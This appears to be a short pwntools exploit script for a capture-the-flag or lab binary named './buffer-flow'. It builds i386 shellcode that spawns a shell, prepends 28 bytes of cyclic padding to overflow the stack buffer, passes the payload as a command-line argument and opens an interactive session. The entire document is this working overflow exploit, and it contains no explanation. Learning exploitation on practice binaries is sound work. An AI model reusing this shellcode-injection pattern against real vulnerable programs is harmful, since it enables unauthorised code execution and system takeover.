from pwn import *

context.update(arch='i386', os='linux')

shellcode = shellcraft.sh()
print(shellcode)

#cyclic(28)
payload = b'aaaabaaacaaadaaaeaaafaaagaaa'
payload += asm(shellcode)

print(asm(shellcode))

print(payload)

io = process(["./buffer-flow",payload])

io.interactive()